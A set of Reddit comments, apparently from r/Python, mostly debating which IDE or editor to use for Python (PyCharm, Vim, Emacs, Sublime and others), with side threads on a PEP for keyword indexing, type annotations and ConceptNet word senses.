Not having to dig through dropdown menus. Command-line programs have keyboard shortcuts for everything, just because that's the only way to do anything.
I think it's overall a compromise between classic version numbering and the desire for simplicity, so that the 2.7 / 3.0 gap represents backward-incompatible changes, and the 3.9/4.0 lack-of-gap represents a lack of backward-incompatible changes.
That was kindof a sad way to make that answer qualify as a serious response.
The point is if you select a tool you don't like you really can't blame the tool. 
I use aptana because I love using a ton of memory 
If it involves editing source code then Emacs likely is the right tool for the job.
...now I can use this on things other than my desktop! Thank you! 
I agree with your sentiments, but question your premise (that Vim is not the right tool). The fact that you haven't learned to use vim in a way that fulfills this task is not a limitation of vim. That's not to say that it has no limitations, but this is not amongst them. In addition, I find that it has a number of features that are not found in IDEs, or are not as powerful. Same with emacs, though I'm not familiar with it.
Vim and IPython are a dream team. I use them together constantly to explore my code as I write it. https://github.com/ivanov/vim-ipython
Sublime Text with various plugins. With having to work on multiple different languages throughout the day I've found it to be the most effective one for my workflow.
I'm not sure I understand how.
&gt;You can certainly setup Vi to be very much like an IDE, And I could write thousands of lines of code to try to turn some other language into Python too. It's simply not feasible or worthwhile, however. JetBrains documented all the work involved to try to get what you get out of the box with an IDE: http://blog.jetbrains.com/pycharm/2013/06/vim-as-a-python-ide-or-python-ide-as-vim/
&gt;I find that it has a number of features that are not found in IDEs, Then these aren't features related to coding.
While useful once the programmer has somewhat of grasp, there is nothing like being about to step through a for loop one statement at a time and evaluate variables or change variables at each point in the beginning.
I use PyCharm daily as the IDE for Python projects at work. Otherwise, for small scripts it is Vim or Emacs. Edit: Pycharm has a community version now (free). Give it a shot.
How does that describe "portability"? It's more like "I'm already using Vim. At least if we're not talking about Windows, that's nothing you can't do with any other IDE.
&gt; Investing in learning how to use the shell and command line utilities will pay &gt;dividends far greater than learning how to use any IDE. Tell that to a C# programmer. I'm sure they're making a fine living from their IDEs. 
I think it's because the question was about IDEs people used, not text editors.
I'm bouncing right now between PyCharm and something that hasn't been mentioned here yet, [Eric](http://eric-ide.python-projects.org/). PyCharm is very full-featured, but as of now I tend to like the UI of Eric a bit better and it does have some unique features like collaborative editing. Also, some of its features (like code coverage) are only available in the commercial version of PyCharm.
The plugins are designed to work independently and you don't need 200 of them. Your toaster with plugins could not be an IDE
I'm not a vim user, but I was under the impression that it pretty much is an IDE once you load it up with plugins. (In the sense that you don't have to leave it to build, debug etc.)
Vim is much better at text editing than those IDEs are.
It's pretty much plug and play. It works like all other projects in VS, in my experience. 
I've been using PyCharm for a little while now, so far so good. Better then vim for complicated code but I miss my vim commands.
I doubt your toaster has enough memory to run python programs.
There's a 30 day trial if you want to try before you buy.
vim
Vim + Syntastic + Pyflake. Seriously all you need. It'll check the syntax, alert you to obvious errors, and be lightweight. Plus it's vim... you'll be more productive anyways.
PyScripter. Just wish the project was more active, but it works great for my use.
Gnome terminal and vim you mean, yeah? 
While I can imagine this being useful in a build script, I simply use fabric.
Especially if the binary is still called python3.
How is that different than what I said?
Vim with ctags - mostly because all the development I do in python are on remote machines.
Of course python has a formal standard! Here's 3.4's: https://docs.python.org/3.4/reference/ I don't really know or care about C++ implementations, so these references to it aren't really going to convince me of anything. I don't really see how you can argue against the claim that if you don't support all of the features of the language, you're supporting a subset of the language. And if you're supporting a subset of the language, obviously you're not supporting said language (because it's a superset of the language that you actually implemented). Finally, depending on how many features you actually supported, you could call this implementation that supports the subset of all the features a whatever-like language. I don't see how you can argue against this. It's simple logic.
Gvim spawns its own window rather than running inside the terminal.
So? Alt-tab is fast.
you can enable most vim commands in pycharm
Emacs. Not many Python-specific packages used though. Mainly jedi, flymake (pyflakes/flake8) and running ipython inside (multi-)eshell.
My work is in C right now, but my last job had a lot of python and my reasoning for part of this relates to my current job so... Really you can get by with a solid editor like Notepad++ (Windows), or Geany (Linux). If you want more towards an IDE then Slickedit, Eclipse, or Netbeans will work great, but they will be way overkill for what you need. Ninja IDE and Sublime might also be worth looking into. But, if you are working on linux at all, spend some time getting used to VIM or EMACS. Just a cursory knowledge is enough so that you don't hate yourself when using them. Recently we had some network issues at work and the development team lost access to our SlickEdit license server. SlickEdit had features that we couldn't find acceptable versions of elsewhere and most everyone was shit up a creek for a week while IT/Support figured something out. I however just jumped onto a linux box that I had VIM lightly configured on and kept working. It still doesn't have the features that I was using SlickEdit for (SE has stupidly good tagging it seems) but it worked well enough that my day wasn't affected.
Oh, I meant as an industry, 30 years ago or whatever. Just something to not have them be numbers that screw with people's mental models and don't sort properly if you sort them naively. 
People tend to get defensive over the subject. I don't believe VIM is an IDE, but not to the point where I feel the need to vigorously defend that belief. I think the most correct answer would be "I don't use and IDE, I use VIM for everything", but even then someone would complain about it. Programmers, in my opinion, tend to be an dramatic bunch.
I've really been enjoying Atom. 
The right tool for the job also depends on what you know as well. You can't compare a new coder with somebody who has been using VI for a few years. My viewpoint obviously differ from others, but I don't really like a "big" IDE because they are good at *hiding* complexity, but complexity kills big projects.
How about multilingual plugins? That's fairly related to coding. How about the ability to put your config into one file and using it wherever you go? How about the ability to run it inside a terminal? How about the ability to use it remotely on a server? How about the ability to craft it to work best for the specific problem or project you're working on? These are all things 'related to coding' that I've seen a lot of IDEs miss.
Speaking of WordNet, one of the things I've always liked about it, which I miss in ConceptNet, is Wordnet's modeling of distinct senses for a word. Do you know why ConceptNet throws those out? For example, take all the edges ConceptNet has for the digit ["5"](http://conceptnet5.media.mit.edu/web/c/en/5). In Wordnet, there'd be separate "sense" records to distinquish between the "5 database" vs the "5 musical work" vs the "5 person", etc. But in ConceptNet, there's no way to do that, so I'm forced to treat "5" as an amalgam of all these senses. This is going to get really ugly in a 20q app because it's going to be nearly impossible to tell which sense the user is referring to. e.g. If I ask "is it a database?", the user could genuinely answer "no", referring to the "musical work" sense, but ConceptNet has no way to distinquish between them.
Emacs or vim. 
PDB and vim then?
The problem a lot of people have with calling vim an IDE is most people have figured out vim isn't really great at being at doing everything (as I think most IDEs aren't either). From what I've seen, most vim users would rather edit text in vim, and then use their favorite debugger, then use their favorite build system. It's kind of like modularizing the IDE so that you can pick and choose your favorite parts and not have dependencies on one another.
``` TypeError: exceptions must be old-style classes or derived from BaseException, not str ```
Oh hey, look, the daily "Which IDE should I use" thread.... :-/
If you use vim then the youcompleteme plugin is really good.
I am not doubting this, but what proposed changes that would break python could we see in python 4.0
Short version: This extends Python's indexing syntax to allow references to named keyword arguments, as in the following examples: a[K=3, R=2] gridValues[x=3, y=5, z=8] rain[time=0:12, location=location] low_accuracy_energy = computeEnergy(molecule, BasisSet[Z=3]) lst = [1, 2, 3] value = lst[5, default=0] # value is 0 value = array[1, 3, interpolate=spline_interpolator] value = array[1, 3, unit="degrees"] 
You can also use vim keybinds in Sublime--which is what I like to do. Just set vintage mode to true in sublime's settings.
This article is FUD.
IDE: PyCharm Editors: Sublime Text and vim It all depends on what I am doing.
Why does every IDE discussion have to have this asshat? "Use vim or you suck!" No, the fact that you dont want to learn modern tools for modern languages means you suck.
Oooh, I didn't know JetBrains was working on a C++ IDE. That's awesome!
Sublime Text + Ctrl B is all you need.
same here. i use it for scala, ruby, clojure, d, fantom and python.
Sublime Text 2 for python programming. Its light weight and good for scripting. I've heard a lot of good stuff about PyCharm but never tried it. 
So? Development is more than just coding.
As is Emacs.
You can't use an IDE through SSH, and even with Syntastic and YouCompleteMe Vim is still lighter than something like Eclipse.
Why does every discussion have some asshat putting words in someone's mouth so they can hop on a soapbox to bitch about it?
I personally like the cli-only workflow because I can seamlessly work between local and remote vim. This way all I really need is a terminal. But yeah, alt-tab is fast :)
Check out [idlex](http://idlex.sourceforge.net).
He didn't say anything about sucking. Those were your words. It is interesting though that text editors always get mentioned in IDE discussions. This implies that for many people, text editors indeed *are used* instead of IDEs. Regardless of whether you agree with this choice or not, it is clearly a popular choice. Maybe you see text editors as bicycles, and IDEs as cars, and a bike could never replace your car. Then again, the OP might really just need a vehicle for commuting three miles in Europe, so a bicycle might work just fine for him. Apples vs Oranges is not that big a difference if all you're looking for is food. TL;DR: relax
IdleX.
I didnt put words in anyone's mouth, if the vim cult states it, they all state it.
I've used Geany for about two years, but seriously thinking of switching python dev to Brackets, which I've been using for frontend work, and is really quite awesome. 
I used Geany for two years for Python, but recently have been seriously considering switching to Brackets, which is extremely good with a very powerful addon system. 
All he said is that he uses it for everything. Why did you go off on a rant about people who say "use vim or you suck"? He didnt say that. He never said he didnt want to learn modern tools either. You have some real pent up issues with "vim users" it seems.
The vim cult has stated it. I use text editors all the time (vim and notepad++), but i have NEVER mistaken a text editor for an IDE. But then i am not a member of the vim cult...when you only have a hammer...
I have never pissed off so many bastards.
Emacs
Me too :( I have notepad++, spyder, eclipse, and sublime. Somehow I always go back to idle. 
Right here with you, awesome stuff. Getting a little creative with the build system can let you work on really complicated projects and have your test suite or test runner just a couple of keystrokes away. 
Emacs with jedi (http://tkf.github.io/emacs-jedi/latest/) is the best Python IDE I've had the pleasure of using.
yeah, the perfect way to introduce a newcomer to python is to suggest to them that they install 200 plugins for vim which most of them they wont know how to work, what they do or how to configure them, and figure out the labyrinth archaic keybinding scheme and how everything works instead of being able to focus on the scripting itself 
That sounds great :-)
Those are in ConceptNet 5, actually! Look at the URI for one of the "musical works", for example, and it's /c/en/5/n/jacques_brel_album. Assertions in the more traditionally-crowdsourced parts of ConceptNet, the ones that come from Open Mind and Verbosity and stuff, won't have word senses. But when we incorporate another data source that has word senses, we keep them, and try to transform them into the same format. Now, here's the drawback. Word senses come from WordNet, Wiktionary, and DBPedia. (And you've noticed that DBPedia senses are kind of weird; they come from Wikipedia disambiguation pages, and you have to confront the fact that everything is an album title.) So what you really have is too *many* senses. Very often you'll have the senses from WordNet and Wiktionary that mean the same thing but are named differently. However, I've just learned that NTU Singapore has published something that unifies WordNet and Wiktionary senses as Creative Commons data, as part of their Open Multilingual WordNet project. That would merge a lot of the redundant senses if I use it in a later version of ConceptNet.
Yeah and the features in the paid edition are aweeeeeesoooooome!! I bought it. If you work on an open source project, you can apply for a free professional license.
I use Geany too, though sometimes it feels like it's lacking... something, so I might try a few of the examples here.
I find IDE limits my workflow. It is way faster to do Ctrl-P and enter a file name then to move my mouse to a tab/file in the project. Also, with vim you can learn one editor once and it is good for c/c++/python/javascript/whatever. With an IDE, they tend to be only good at a few languages. So you end up learning multiple different short cuts/work flows. I also feel sorry for you if you ever have to use Eclipse or visual studio. Those two are SO SLOW. 
I used spider before. Its uniqueness is on great tools to display vectors and matrices. 
Linux is my ide. vim is my text editor - I run it in a tmux window, and I have another tmux pane that I use for execution. If I need to keep a web browser open, I use the i3 window manager to handle the browser window and a terminal emulator. 
C# is a nice language. But a lot of the jobs for .NET c# consist of dragging and dropping .NET controls. Many of these developers do not really have a good understanding of how everything works. It is "magic" to them. A good programmer is well rounded. They can use .NET when they need it. But they should know other languages and not only depend on Windows
It depends on your workflow. If you have build scripts (ant, maven, make), you could do without an IDE pretty well. Whatever makes you more efficient, go with it. I do not think there is a "right" way. I do think that some IDE's like Visual Studio do hide a lot of the complexity in software development, so a lot of it seems like "magic". 
I just wish that I could more easily terminate out of control scripts from within Sublime. 
Gnu Emacs + Elpy. And also other emacs packages for making stuff interesting!
I use Geany for most of my non-python development (I have PyCharm and most of my Python work is in web frameworks), can't recommend it enough.
Many developers use vim as their main development platform Other famous programmers who use vim/emacs: [John Resig](http://ejohn.org/blog/etherpad-real-time-editing-with-javascript/) - creator of jQuery [Charlie Cheever](http://qr.ae/uiP9x) - founder of Quora, also worked at Facebook Peter Norvig - Emacs Linus Torvalds - Micro Emacs Guido van Rossum - Emacs [source](http://usmanahmad.wordpress.com/2006/08/02/great-programmers-answersinterview-with-steve-yegge-linus-torvalds-dave-thomas-david-heinemeier-peter-norvig-james-gosling-guido-van-tim-bray/) Plenty of legendary programmers have used Emacs/Vim as their primary development text editor. It is not like you can do anything in an IDE that you cant in a text editor. People just build their own scripts and use command line. It might not be your thing. But it must mean something if some of the top programmers in the world are doing it. 
Thanks for letting me know about this, I've not seen this module before. Looks very good, I like the serializer functionality that it offers. Xmldataset in comparison is designed for the extraction of xml data only with a simplistic markup definition language. The inspiration for the module came from XML Simple in Perl. I wanted a simple means of gathering XML into Python without having to pull back the entire document as a structure and without having to write much in the way of code or markup.
It seems weird having an IDE for C++ implemented in Java
This exactly. A tool like this would've been great for me 9 months ago. Great work.
Honestly: why the fuck do all the people who run their systems at &lt;50MB RAM even buy more RAM? Not using the memory you have is literally nothing but a complete waste of money.
Pycharm. OP should have made a google docs survey.
What is it and why do you prefer it?
It does. I generally am not big on Java, but JetBrains does awesome work; I don't really care how they do it. As a side note, Java-implemented C++ IDEs are not without precedent. I know Eclipse CDT isn't that popular, but they make it work (slowly). This looks quite responsive, though, and it looks like it might have better inspection/autocomplete features than other Linux alternatives.
I'm a friend of semantic versioning. If you don't have a time based release schedule and no breaking change necessitating to bump the major version, I think bumping the minor version is perfectly fine.
Stop hatin'. Anything that helps people get into programming should be encouraged. 
I'm not sure what to say, like I said. It's just an IDE, written in Python, that's not incompetent or bastardized. Yes, those are distinguishing traits. The only other thing I can think of is to mention http://editra.org , but I freely admit that they significantly understate editra's functionality there
Wing
How did you find out your whatsapp password?
 &gt;I freely admit that they significantly understate editra's functionality there I'm sure that this is the reason for the problem of it not being known.
I'd suggest this website: http://www.checkio.org/ There are many missions to do, where you write code to do the given task, and afterwards it checks if your code works. As you finish missions, you gain levels and unlock new missions. Another suggestion would be /r/dailyprogrammer, each week 3 challenges with different difficulties are posted. They are usually challenging and interesting, and can be inspiring.
See /r/DailyProgrammer. Lots of things to do there.
&gt; It's also worth noting that Python 3 wasn't expected to be as disruptive as it turned out to be. Nice to see that, but that's a "some mistakes were made" type of phrase. Some of us did expect Python 3 to be disruptive. I'd have reading "the language developers didn't expect it to be as disruptive as it turned out to be". 
tkank you for ur help^^ and.. Would be helpful to study python standard library??
In general, yes. You don't need to know it all by heart, but It's good to know what kind of things it has, so that you can use them when you need them.
Aight, thanks :)
It's great that you are working on open source libraries. And it's surely hard to to keep track of various python libraries rolling around. I think there's a big missed opportunity in gathering the best libraries around and creating a better standard library, for those who are willing to live with some bugs and instabilities in return for higher level tools. Or even better , this shouldn't be just about python libraries. There are tools that interface nicely with python and could lead to even greater simplification and power - so they should be recommended. For example, BigML - which is extremely easy to use machine learning cloud service.And it's much simpler than the best python library. 
* More space for when you do need a lot of memory. * Caching files in RAM.
&gt; perfect way to introduce a newcomer to python is to suggest to them that they install 200 plugins for vim No one suggests that. (Well, I hope not). &gt; labyrinth archaic keybinding scheme Getting used to hjkl is difficult, but once you do, it keeps your fingers on the home row without having to reach for the arrow keys or the mouse.
Of course it's "acceptable". Why wouldn't it be?
this the way i did it , first get the latest yowsup-cli and run the commands http://hacktracking.blogspot.com/2013/02/yowsup-cli-send-whatsapp-messages-from.html
http://xkcd.com/378/ is the only way to write code.
[Image](http://imgs.xkcd.com/comics/real_programmers.png) **Title:** Real Programmers **Title-text:** Real programmers set the universal constants at the start such that the universe evolves to contain the disk with the data they want. [Comic Explanation](http://www.explainxkcd.com/wiki/index.php?title=378#Explanation) **Stats:** This comic has been referenced 178 times, representing 0.5852% of referenced xkcds. --- ^[xkcd.com](http://www.xkcd.com) ^| ^[xkcd sub](http://www.reddit.com/r/xkcd/) ^| ^[Problems/Bugs?](http://www.reddit.com/r/xkcd_transcriber/) ^| ^[Statistics](http://xkcdref.info/statistics/) ^| ^[Stop Replying](http://reddit.com/message/compose/?to=xkcd_transcriber&amp;subject=ignore%20me&amp;message=ignore%20me) ^| ^[Delete](http://reddit.com/message/compose/?to=xkcd_transcriber&amp;subject=delete&amp;message=delete%20t1_cjtg7b8)
I have yakuake at the ready for those moments. I've bound it to the top-right most key (small 2 on french keyboards), so I can call it up for some quick cli goodness whenever I need it.
good suggestions given here already. You can type out programs, fool around with conditional statements and try your hand at solving some code if you wish. Apart from the already mentioned links, check out project euler site. Happy coding! 
Here is an XML to JSON converter too: http://code.activestate.com/recipes/577494/ .
I've used heaps of ide's, and wing is fantastic. 
You are aware that IDEs have keyboard shortcuts for anything you want, too, right?
PyCharm
I dis agree. I use the macro feature in Vim to take care of refactoring frequently. I use intelligent completions from the Jedi plugin, and use various in-environment tools to navigate and explore my codebase. The macros and the ability to program my editor are the primary features that I miss in IDEs, if I'm to be exact.
`&lt;leader&gt;pb` adds a debug line (part of my `.vimrc` config file) to the proper scope and I use another leader-key trigger to execute the code and drop into my `ipdb` debugger. Stepping through code is best accomplished through IPython's `ipdb`, no matter your front end. Debuggers are wonderful, but stand entirely apart from IDEs. In fact, I typically find better debugging interfaces outside of IDEs. The best example would be the debugger in Squeak Smalltalk where you can edit your code as you debug (though one might argue that the environ is an IDE). The next best thing is exploring your code in IPython while you code in your editor of choice.
Well, yeah, motions are better than hammering the h key to get to where you want to go. But using hjkl as an alternative to the arrow keys is better.
The more you use it, the more it wears down, the sooner it will break. Especially if your chips are low-grade consumer stuff, the less you use them the longer they'll last.
Sublime locally and vim on server.
My problem is that I tend to fire up small projects to play with before losing interest/lacking time. I may dig around for discounts though.
Dragging and dropping gets you objects made and positioned on a form, I fail to see how you can make anything of consequence without actually using code to link the "magic" up behind the scenes. Calling .net programmers programming plebians is a pretty big generalisation.
Vim.
I think I'm on board with the explicit axis indexing, but the last three examples (default=0 etc) don't seem right and would be better as functions. I feel like using square brackets should indicate your data is coming directly from a source while functions indicate it might be processed. I.e. dict.get(k, 0) or data.interpolated(...)
Seems not intended for performance: &gt; I am going to make one additional assumption: the main use cases will be linting, IDEs, and doc generation. These all have one thing in common: it should be possible to run a program even though it fails to type check. Also, adding types to a program should not hinder its performance (nor will it help :-). In my opinion it's still good as it will help linters a lot.
Pycharm is the best python ide in my opinion
I use http://brainwy.github.io/liclipse/
Please no. This PEP waters down the semantic meaning of ``__getitem__`` completely and turns it into syntactic sugar for method calls. What bothers me the most is that these 'queries' may match multiple items, but ``__getitem__`` is supposed to return a single item from a container type. Also, what @klohkwherk said: ``__getitem__`` should just return an item, not compute, alter or otherwise process it. Thats what methods are for.
I use IntelliJ, since I tested the new Android Studio (based on the community version of IntelliJ) and as there is a really cheap student licence, I purchased one and now I have One IDE to rule them all, One IDE to find them, One IDE to bring them all, and in the darkness bind them.
The One True Editor: emacs. 
http://code.ahren.org/vim-cheatsheet http://naleid.com/blog/2010/10/04/vim-movement-shortcuts-wallpaper 
http://www.thegeekstuff.com/2009/03/8-essential-vim-editor-navigation-fundamentals/
I honestly am not used to working on one box, my old IDE just used to be please don't hate me for this *nano* on random boxes, now i have a somewhat decent vim setup but I still need to find one central box to hack code from (I don't really do big projects in py)
someone is down voting comments with the keywords 'vim' or 'sublime'. LOL! 
stop replyin to long dead threads
none of this has anything to do with what i'm saying. you should learn to read better. 
i use geany for c. i really like that you can set your build commands. also its really fast.
This isn't a constructive comment, but using the emoticons to close parentheses reminded me of this xkcd: http://m.xkcd.com/541/
Well, I use tmux with vim navigation keybindings and CapsLock rebound to Ctrl. So you don't really have to take your fingers off the home row. Most ncurses apps also support vim keys out of the box.
Touche. Guess that works doesn't it :P I just don't think it's necessarily worth the effort in learning unless you really want to. Still think the benefit would be minimal
You could learn Emacs. The key bindings translate to the shell as well as all other gnu software. Also most programs in OS X which is kinda cool. 
This syntax is suuuupergross, verging on line noise. I'm dreading the day I see this in some code that I'm using.
It might not be intended for performance *in CPython*. However, other implementations can still use the annotations for optimization. I believe that numba is using something similar.
Didn't know Brackets supported any non-frontend-languages. Is there a plugin for Python or something?
In practice, I think you'll find that doesn't work out well. Because the annotations are used for linting and doc generation and are not checked at runtime, there's no requirement for the type system to be sound or for the user's type annotations to be 100% correct. If the type annotations can't be fully relied on, a Python implementation can't get the performance improvements you get in other statically typed languages.
KDevelop. Just read through some of the [blog posts here](http://scummos.blogspot.co.uk/search/label/kdev-python) to get an idea. It has the best autocomplete in any Python IDE I've used.
(Like this ☺)
The array visualization feature and object inspection really are kickass. So far I'm stuck with PyCharm because Spyder has some stability issues on my machine.
Except Pycharm costs major $$$. http://www.jetbrains.com/pycharm/buy/
A C cast can't be fully relied on, but a compiler trusts it anyway. You could make a Python compiler that simply trusts the annotations and segfaults otherwise. Or the JIT can always have a heavily optimized function for the types that the annotations state and revert to.. well JITting if the types are wrong. Also, a type checker can sometimes prove that an annotation is correct (see mypy) and then rely on it for optimization. It should be easier for a compiler to prove that an annotation is correct than to come up with its own annotation (easier to verify than to find answer, P vs NP and all that). 
&gt; Those are in ConceptNet 5, actually! Look at the URI for one of the "musical works", for example, and it's /c/en/5/n/jacques_brel_album. Oh wow, great, thanks. I had noticed a few of those, but I thought they were only for proper nouns, not all the Wordnet senses. Restricting myself to those should make my job a little easier, even if there are duplicates. I can see the problem in unifying senses. I ran into the same problem in an earlier project when I toyed around with merging some custom data with Wordnet. I hope you're able to make use of that dataset.
There's at least one person literally calling to eradicate all decorators and replace with static typing. FUCK THAT. That being said, for IDE purposes, I'd love to have explicit static typing. Dynamic typing was awesome when I was a young kid and loved the idea of saying x = "foo" and then later x = 5, but now I hate that shit since I deal with complex arrays of stuff.
I don't know, $100 isn't bad for something I use for like 8 hours a day.
How do you like the full IntelliJ vs just PyCharm?
Definitely true. WingIDE's debugger is hands-down the best in the industry. PyCharm, while good, doesn't come close to both the speed and the reliability of WingIDE's debugging -- even remotely.
PyCharm for me too, but I also keep a copy of WingIDE around, which I used for years and years before PyCharm came out. WingIDE's debugger is still capable of more reliably injecting itself into complex code and doing it well, whereas PyCharm is considerably less reliable in terms of debugging. What's astonishing to me about PyCharm is that even the more obscure things it still does well, like git integration.
Weirder than a Python IDE implemented in Java?
IDLE if I am programming something on my main machine, Nano if remote. For whatever reason, I am a fan of keeping the IDE as simple as possible. 
Exactly. See Cython, for example. 
probably because those methods would have to be written exactly because there's no way to express the same need using `__getitem__` ... it's a bit circular... You might also say who needs a[1,3] when you can do a.get(1,3) An indexing operation is an indexing operation on an n-array. The index refers to axes, and can either be expressed by order (assigning a specific numerical order to each axis) or by keywords (assigning a specific name to each axis). At the moment, you can only express it by order. That PEP extends for the possibility to refer to axes by name. This is particularly important if you handle n-arrays with n&gt;3 where index order may become confusing and hard to remember, to handle arrays when the order is critical but you may screw it up, as in a 3d grid whose content can either be in xyz or zyx order. With named axes you would not care. With ordered axes, you will get bugs. You also get a more communicative expression of intent, much higher than a method call. The indexing syntax is semantically loaded. Also, with those methods, referring to a slice is clumsy. 
I agree, see my comment above. 
Ok, now what if you want a slice? The change is completely neutral and backward compatible. I don't see it as a big deal. 
tldr: Use [IDLE](https://en.wikipedia.org/wiki/IDLE). Ed man! Ed is the standard text editor. Just kidding. I use Vim with [command-t](https://wincent.com/products/command-t), [fugitive](https://github.com/tpope/vim-fugitive), and some other odds and ends, and run it inside of [tmux](http://tmux.sourceforge.net/) with [oh-my-zsh](https://github.com/robbyrussell/oh-my-zsh) and [powerline](https://github.com/Lokaltog/powerline). With a setup like this, you can basically mold your setup around whatever you are doing at the time... It's super flexible, and the layout of every single one of my tmux windows (tabs) is different, depending on the project that I'm working on. [Here](http://www.drbunsen.org/the-text-triumvirate/) is a pretty decent guide to setting up Vim with tmux and some other goodies. edit: Almost forgot... For python autocompletion, [Jedi](https://github.com/davidhalter/jedi-vim) is awesome, and [syntastic](https://github.com/scrooloose/syntastic) is good for syntax checking. edit again: I'm sure people will jump in and say you shouldn't use Vim because it's hard, or some such bullshit, but you need to learn your tools before you can use them to build things, just like a carpenter wouldn't try to build a house before knowing how to use a hammer, saw, square, or knowing what a soffit or load bearing wall is, for example. And I'm not saying YOU should use Vim even... You asked what we used, so I shared. But I would suggest getting cozy on the command line. Emacs or Vim will prove to be a huge time-saver later down the road. Any simple text editor with syntax highlighting should get you started, especially if you're new to programming. There's many choices like [Notepad+](http://www.notepad-plus-plus.org/), [gedit](https://en.wikipedia.org/wiki/Gedit), [geany](https://en.wikipedia.org/wiki/Geany), etc... If you're just learning, you really don't need an IDE yet. You need to learn the basics before trying to use a miter saw and worrying about hanging cabinets, if you get my drift. For python, you can use [IDLE](https://en.wikipedia.org/wiki/IDLE) as a basic learning/development environment, which combines a run-time environment and a code editor. It comes with Python, so it's built in... No extra crap to install.
Thats another story. If you want slices everywhere, I'm with you :) slice = [1:2:3] array[slice] And while we are at it, implement the range() API on slices: for i in [:100]: pass I would totally +1 that :)
Arg. :thumbsup: isn't emoji. 👍 is. Emoji don't need some special :foobar: syntax to represent them because they are themselves characters. They represent themselves just fine, that's the point. This should be called something like "emoji-cheat-sheet support for python" 
&gt; for i in [:100]: &gt; pass &gt; I would totally +1 that :) This is totally cool indeed. 
It's not horribly priced, besides there's a free open-source Pycharm called Community Edition which is free, (just no Django support). http://www.jetbrains.com/pycharm/download/ 
Amen. Add to that the difficulty in refactoring large code bases without static typing, and you have some very compelling reasons to add it to the language, even if its use is completely optional. I can imagine one of the first steps in normalizing a new module for use in a large system will be to add static annotations to the code. That will allow a number of assumptions to be made and obviate a lot of the unit testing code that would otherwise be necessary just to ensure basic types. Seriously, this one new feature could make using Python in enterprise systems a much easier sell in the future.
**Pycharm**, but if you are using free version you won't get css markup
See the sidebar: **Posting code to this subreddit:** Add 4 extra spaces before each line of code
So.. do you need to implement RSA encryption in python? 
based on this article it wouldnt detect african or dark chicanos very well. Microsoft ran into a similar when they had this feature to determine is the user was at the desktop or not.
ah:)
Though I agree with you, I feel that the demand for an optionally typed system in Python outweighs that fact. We can all agree that Python is a clear and concise language, and though it seems any statically typed implementation will cause unwanted line noise, the fact that it is contained in a function declaration mitigates its impact while providing a large bonus not only when refactoring and maintaining a large project, but also during its development. If I could see, at a glance, just what type of objects were needed for a function to operate on, I could immediately spot many things that would normally require me to either read documentation (that might not exist or be out of date) or manually parse the code itself: coupling issues between sources of data, an edge case from assuming that the function will be passed a certain data type, and the ability for the calling code to know exactly what to pass it, without relying on the developer to write documentation (which becomes out of date as soon as it's written) while also allowing the intetpreter/linters the ability to catch any silly invalid function calls. I love my readable Python. But I'd also love a Python that worked with me in determining type conflicts, instead of leaving me to figure it out myself. 
Coming in 2.4. There's already a pull request open with some minor details left to be finished. It's really really cool :-)
Displaying Pandas DataFrames and TimeSeries is coming in 2.3.1
I hope to add Vim keybindings to Spyder some day. I have some good ideas on how to do it, it doesn't seem that hard :-)
Fair enough, I admire your pragmaticism 
I liked the docstring approach too. It's way more readable in my opinion. (Still a little noisy, but any approach is going to have some noise)
Right. For expert jobs the pay is pretty good. I get the impression there's also a decent amount of stuff at more junior levels.
If I had a dollar for every time in my personal projects I had to write some whack comment describing in pathetic detail the format of the array being passed when, with static typing, I could have probably moused over the variable in the IDE and been presented with a nice UI with expandable and contractable components so I could easily see and recall the format...I'd have maybe a few dollars. Not a million dollars. But maybe enough to get a good burger or something.
Shots fired.
Do you mean the type annotation syntax in general: def example(a: int, b: float) -&gt; number: return a/b Or just the List[int] part? If the latter, you may prefer what [obiwan](https://pypi.python.org/pypi/obiwan/1.0.2) is doing: def example7(numbers: [int], phonebook: {str : int} ): ... I think using python's syntax for types makes more sense, but it can still get really ugly: def nearest_point_on_line(line:((int,int),(int,int)),pt:(int,int)) -&gt; (int,int): ... 
*cough* pycharm *cough*
I'm sure if you developed that, Continuum Analytics would loveeee to get their hands on that code. Hell I would too.
Yeah this is actually what I am using currently 
http://blog.programmersmotivation.com/2014/06/19/beginner-programmer-want-learn-programming-start-build-crap/
Yeah, the main thing I cared about was keeping the actual python clean. If they were making a reach for performance here I *might* be ok with the mypy approach but since its just for lint and docs anyways, docstrings are already THERE for that. Seems counterintuitive to me 
Navigating using the arrow keys and mouse work fine for me.
It may not work to throw third party code into a static compiler, but it could let you use those annotations in code you control, and statically compile specific functions or modules to get speed ups.
The nice thing about Python is that it's well designed. So it doesn't really need an IDE. You never have to worry about where something might be imported from, because you can scroll to the top of the file you're working on and check. I contend that only poorly-designed languages really require IDEs. And the Pythonic way of doing it is a text editor and a REPL.
is there a problem w/ C/C++ syntax for types? seems much cleaner to me. def example(int a, list b): int c = 0 
The free one should work with Django it just won't automate some of the stuff for you like the paid version.
I wish I could combine Sublime text with the Pycharm debugger and intellisense. If that were a thing I would never leave Sublime text, but Pycharm is hard to beat for debugging and the editor is pretty good, just not as fast and intuitive as Sublime Text imo. Another decent free editor with debugging is Pyscripter which I used to use all the time until I decided to try PyCharm. 
I'm always getting my indices messed up with NumPy, so this would be potential useful. I do agree that it might be taking the concept of indexing too far though.
I think I remember one of the PyPy guys saying it wouldn't help its performance.
Agreed, you have to custom configure. Still annoying if your using CE and there is now Django template to preload. 
I never actually used PyCharm. I started out with IDLE, then went to NetBeans. That was quite a few years ago, and I mostly just used text editors (TextMate then Sublime Text) until I got IntelliJ for Scala and Dart work and figured I might as well use it for Python too. 
Oh god, that last one. Eek!
It's an exercise in memory and typing.
That might buy just enough beer to dull the pain. And hey, that's a LOT of pain we're talking about, so this isn't chump change either.
True, but new code doesn't need to be "backwards" compatible. If we opt to clean up the syntax by not trying to slide this in sideways using decorators, then we could actually have a much cleaner language over the long term. OTOH - I understand the trade-offs here, so it's not an easy decision. I do trust Guido to error on the side of maximum benefit however. 
It really depends on the performance level you're aiming for. As insine mentioned, bare regular expressions could get you up to a certain performance. Whatever approach you want to use, if you want to go further than a simple algorithm, then you'll probably have to create a data set, by hand labelling each word/line (address, first_name, last_name, email, etc.). That will allow you to evaluate numerically the performance of each algorithm, and to apply machine learning algorithms.
In many cases, a doctest would work in place of documenting the type (and be more likely to be correct :)
Actually, I think it would really be a clever gimmick. Do you want to help me writing a PEP ?
